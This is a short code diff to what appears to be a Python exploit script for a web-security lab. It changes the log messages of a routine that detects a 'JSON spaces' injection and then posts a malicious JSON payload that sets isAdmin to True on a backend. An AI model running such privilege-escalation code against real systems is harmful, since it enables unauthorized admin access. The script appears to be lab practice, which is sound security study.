@@ -114,9 +114,10 @@ def main(lab_url: str):
 
         sleep(1)
         if response.text != request_to_back_end.text:
-            print("json spaces è stato iniettato")
+            print("*** JSON SPACES HAS BEEN INJECTED ***")
             new_request = manipulate_json_after_json_spaces(json_malevolo)
             request_to_back_end = requests.post(URL_BACKEND, data=json.dumps(json_malevolo), headers=headers)
+            pretty_print(f"Malicious payload with isAdmin setted to True: {str(json_malevolo)}","red")
             print(request_to_back_end.text)
             sleep(1)
             driver.refresh()
